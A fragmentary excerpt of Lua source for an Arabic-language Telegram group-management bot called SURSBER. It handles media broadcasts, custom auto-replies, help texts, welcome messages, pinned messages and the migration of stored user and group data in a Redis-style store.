end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
RioText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevAbs:set(SURSBER..'Rio:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
RioText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevAbs:set(SURSBER..'Rio:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
RioText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevAbs:set(SURSBER..'Rio:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
RioText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevAbs:set(SURSBER..'Rio:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
RioText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevAbs:set(SURSBER..'Rio:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
RioText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevAbs:set(SURSBER..'Rio:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
...
if not Bot(msg) and DevAbs:get(SURSBER..'Rio:Lock:Rd'..msg.chat_id_) then 
...
local List = DevAbs:smembers(SURSBER..'Rio:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end end
DevAbs:set(SURSBER..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevAbs:get(SURSBER..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
if not DevAbs:sismember(SURSBER..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
...
DevAbs:set(SURSBER..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevAbs:set(SURSBER..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
...
DevAbs:set(SURSBER..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
...
DevAbs:set(SURSBER..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان" ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRedod = DevAbs:get(SURSBER..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
DevAbs:set(SURSBER..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevAbs:set(SURSBER..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevAbs:sadd(SURSBER..'Rio:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     Source SURSBER     --
...
local List = DevAbs:smembers(SURSBER..'Rio:Manager:GpRed'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevAbs:set(SURSBER..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevAbs:set(SURSBER..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRed = DevAbs:get(SURSBER..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
...
DevAbs:set(SURSBER..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevAbs:set(SURSBER..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevAbs:sadd(SURSBER..'Rio:Manager:GpRed'..msg.chat_id_,text)
DevAbs:set(SURSBER..'DelManagerRep'..msg.chat_id_,text)
return false
end end
--     Source SURSBER     --
...
local List = DevAbs:smembers(SURSBER.."Rio:Sudo:AllRed")
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevAbs:set(SURSBER.."Rio:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevAbs:set(SURSBER.."Rio:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetAllRed = DevAbs:get(SURSBER.."Rio:Add:AllRed"..msg.sender_user_id_)
...
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevAbs:set(SURSBER.."Rio:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevAbs:set(SURSBER.."Rio:Add:AllText"..msg.sender_user_id_, text)
DevAbs:sadd(SURSBER.."Rio:Sudo:AllRed",text)
DevAbs:set(SURSBER.."DelSudoRep",text)
return false 
end end
--     Source SURSBER     --
...
local redod = DevAbs:smembers(SURSBER..'Rio:Manager:GpRedod'..msg.chat_id_)
MsgRep = '᥀︙قائمة الردود المتعدده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevAbs:smembers(SURSBER..'Rio:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
...
if not Bot(msg) and DevAbs:get(SURSBER..'Rio:Lock:GpRd'..msg.chat_id_) then 
...
for k,v in pairs(redod) do
DevAbs:del(SURSBER..'Rio:Text:GpTexts'..v..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Manager:GpRedod'..msg.chat_id_)
end
...
local redod = DevAbs:smembers(SURSBER..'Rio:Manager:GpRed'..msg.chat_id_)
MsgRep = '᥀︙ردود المدير ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevAbs:get(SURSBER.."Rio:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevAbs:get(SURSBER.."Rio:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevAbs:get(SURSBER.."Rio:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevAbs:get(SURSBER.."Rio:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevAbs:get(SURSBER.."Rio:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevAbs:get(SURSBER.."Rio:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevAbs:get(SURSBER.."Rio:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevAbs:get(SURSBER.."Rio:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
...
for k,v in pairs(redod) do
DevAbs:del(SURSBER..'Rio:Gif:GpRed'..v..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Voice:GpRed'..v..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Audio:GpRed'..v..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Photo:GpRed'..v..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Stecker:GpRed'..v..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Video:GpRed'..v..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:File:GpRed'..v..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Text:GpRed'..v..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Manager:GpRed'..msg.chat_id_)
end
...
local redod = DevAbs:smembers(SURSBER.."Rio:Sudo:AllRed")
MsgRep = '᥀︙ردود المطور ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevAbs:get(SURSBER.."Rio:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevAbs:get(SURSBER.."Rio:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevAbs:get(SURSBER.."Rio:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevAbs:get(SURSBER.."Rio:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevAbs:get(SURSBER.."Rio:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevAbs:get(SURSBER.."Rio:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevAbs:get(SURSBER.."Rio:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevAbs:get(SURSBER.."Rio:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
...
for k,v in pairs(redod) do
DevAbs:del(SURSBER.."Rio:Add:AllRed"..v)
DevAbs:del(SURSBER.."Rio:Gif:AllRed"..v)
DevAbs:del(SURSBER.."Rio:Voice:AllRed"..v)
DevAbs:del(SURSBER.."Rio:Audio:AllRed"..v)
DevAbs:del(SURSBER.."Rio:Photo:AllRed"..v)
DevAbs:del(SURSBER.."Rio:Stecker:AllRed"..v)
DevAbs:del(SURSBER.."Rio:Video:AllRed"..v)
DevAbs:del(SURSBER.."Rio:File:AllRed"..v)
DevAbs:del(SURSBER.."Rio:Text:AllRed"..v)
DevAbs:del(SURSBER.."Rio:Sudo:AllRed")
end
...
DevAbs:set(SURSBER..'Rio:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
...
DevAbs:del(SURSBER..'Rio:NameBot')
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم حذف اسم البوت'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
end end 
--     Source SURSBER     --
...
DevAbs:set(SURSBER..'Rio:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SURSBERTeam =  DevAbs:get(SURSBER..'Rio:Help0'..msg.sender_user_id_)
if SURSBERTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbs:del(SURSBER..'Rio:Help0'..msg.sender_user_id_)
DevAbs:set(SURSBER..'Rio:Help', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevAbs:set(SURSBER..'Rio:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SURSBERTeam =  DevAbs:get(SURSBER..'Rio:Help01'..msg.sender_user_id_)
if SURSBERTeam == 'msg' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbs:del(SURSBER..'Rio:Help01'..msg.sender_user_id_)
DevAbs:set(SURSBER..'Rio:Help1', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevAbs:set(SURSBER..'Rio:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SURSBERTeam =  DevAbs:get(SURSBER..'Rio:Help21'..msg.sender_user_id_)
if SURSBERTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbs:del(SURSBER..'Rio:Help21'..msg.sender_user_id_)
DevAbs:set(SURSBER..'Rio:Help2', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevAbs:set(SURSBER..'Rio:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SURSBERTeam =  DevAbs:get(SURSBER..'Rio:Help31'..msg.sender_user_id_)
if SURSBERTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbs:del(SURSBER..'Rio:Help31'..msg.sender_user_id_)
DevAbs:set(SURSBER..'Rio:Help3', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevAbs:set(SURSBER..'Rio:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SURSBERTeam =  DevAbs:get(SURSBER..'Rio:Help41'..msg.sender_user_id_)
if SURSBERTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbs:del(SURSBER..'Rio:Help41'..msg.sender_user_id_)
DevAbs:set(SURSBER..'Rio:Help4', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
DevAbs:set(SURSBER..'Rio:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SURSBERTeam =  DevAbs:get(SURSBER..'Rio:Help51'..msg.sender_user_id_)
if SURSBERTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbs:del(SURSBER..'Rio:Help51'..msg.sender_user_id_)
DevAbs:set(SURSBER..'Rio:Help5', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevAbs:set(SURSBER..'Rio:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SURSBERTeam =  DevAbs:get(SURSBER..'Rio:Help61'..msg.sender_user_id_)
if SURSBERTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbs:del(SURSBER..'Rio:Help61'..msg.sender_user_id_)
DevAbs:set(SURSBER..'Rio:Help6', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
local Users = DevAbs:smembers(SURSBER.."User_Bot")
local Groups = DevAbs:smembers(SURSBER..'Chek:Groups')
local Sudos = DevAbs:smembers(SURSBER.."Sudo:User")
if DevAbs:get(SURSBER..'Name:Bot') then
DevAbs:set(SURSBER..'Rio:NameBot',(DevAbs:get(SURSBER..'Name:Bot') or 'ديفد'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
DevAbs:sadd(SURSBER..'Rio:Users',Users[i]) 
end
end
for i = 1, #Sudos do
DevAbs:sadd(SURSBER..'Rio:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
DevAbs:sadd(SURSBER..'Rio:Groups',Groups[i]) 
if DevAbs:get(SURSBER.."Private:Group:Link"..Groups[i]) then
DevAbs:set(SURSBER.."Rio:Groups:Links"..Groups[i],DevAbs:get(SURSBER.."Private:Group:Link"..Groups[i]))
end
if DevAbs:get(SURSBER.."Get:Welcome:Group"..Groups[i]) then
DevAbs:set(SURSBER..'Rio:Groups:Welcomes'..Groups[i],DevAbs:get(SURSBER.."Get:Welcome:Group"..Groups[i]))
end
local list2 = DevAbs:smembers(SURSBER..'Constructor'..Groups[i])
for k,v in pairs(list2) do
DevAbs:sadd(SURSBER.."Rio:Constructor:"..Groups[i], v)
end
local list3 = DevAbs:smembers(SURSBER..'BasicConstructor'..Groups[i])
for k,v in pairs(list3) do
DevAbs:sadd(SURSBER.."Rio:BasicConstructor:"..Groups[i], v)
end
local list4 = DevAbs:smembers(SURSBER..'Manager'..Groups[i])
for k,v in pairs(list4) do
DevAbs:sadd(SURSBER.."Rio:Managers:"..Groups[i], v)
end
local list5 = DevAbs:smembers(SURSBER..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
DevAbs:sadd(SURSBER.."Rio:Admins:"..Groups[i], v)
end
local list6 = DevAbs:smembers(SURSBER..'Special:User'..Groups[i])
for k,v in pairs(list6) do
DevAbs:sadd(SURSBER.."Rio:VipMem:"..Groups[i], v)
end
DevAbs:set(SURSBER.."Rio:Lock:Bots"..Groups[i],"del") DevAbs:hset(SURSBER.."Rio:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
...
for i,Lock in pairs(LockList) do
DevAbs:set(SURSBER..Lock..Groups[i],true)
end
end
...
DevAbs:del(SURSBER..'Rio:Text:BotWelcome')
DevAbs:del(SURSBER..'Rio:Photo:BotWelcome')
return false
end 
...
DevAbs:del(SURSBER..'Rio:Lock:BotWelcome')
return false
end 
...
DevAbs:set(SURSBER..'Rio:Lock:BotWelcome',true)
return false
end 
...
DevAbs:del(SURSBER..'Rio:Text:BotWelcome')
DevAbs:del(SURSBER..'Rio:Photo:BotWelcome')
DevAbs:set(SURSBER.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevAbs:get(SURSBER.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevAbs:del(SURSBER.."Rio:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ النص ارسل لي صورة الترحيب\n᥀︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevAbs:set(SURSBER.."Rio:Text:BotWelcome",text) 
DevAbs:set(SURSBER.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevAbs:get(SURSBER.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
...
DevAbs:set(SURSBER.."Rio:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
...
DevAbs:setex(SURSBER.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
...
DevAbs:del(SURSBER.."DevText")
end end
--     Source SURSBER     --
if DevAbs:get(SURSBER.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevAbs:del(SURSBER.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevAbs:del(SURSBER.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevAbs:set(SURSBER..'Rio:ChText',texxt)
...
DevAbs:setex(SURSBER.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)   
...
DevAbs:incr(SURSBER..'Rio:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevAbs:get(SURSBER..'Rio:Lock:EditMsgs'..msg.chat_id_) and not Text and not RioConstructor(result) then
...
local GetMsgPin = DevAbs:get(SURSBER..'Rio:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevAbs:del(SURSBER..'Rio:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevAbs:del(SURSBER..'Rio:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
...
DevAbs:srem(SURSBER..'Rio:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevAbs:srem(SURSBER..'Rio:Groups',v)  
end
...
DevAbs:sadd(SURSBER..'Rio:Groups',v)  
end end,nil) end
end
--     Source SURSBER     --
end 
